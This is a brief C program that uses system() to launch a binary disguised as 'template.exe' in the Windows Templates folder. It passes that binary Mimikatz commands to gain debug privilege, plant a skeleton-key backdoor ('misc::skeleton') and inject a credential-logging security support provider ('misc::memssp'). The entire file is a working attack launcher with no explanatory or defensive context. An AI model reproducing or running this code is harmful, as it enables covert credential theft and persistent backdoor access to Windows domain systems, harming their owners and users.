#include <stdlib.h>

int main()
{
    int i;
	
    i = system("C:\\ProgramData\\Microsoft\\Windows\\Templates\\template.exe \"privilege::debug\" \"misc::skeleton\" \"exit\"");
    i = system("C:\\ProgramData\\Microsoft\\Windows\\Templates\\template.exe \"privilege::debug\" \"misc::memssp\" \"exit\"");
    
    return 0;
}
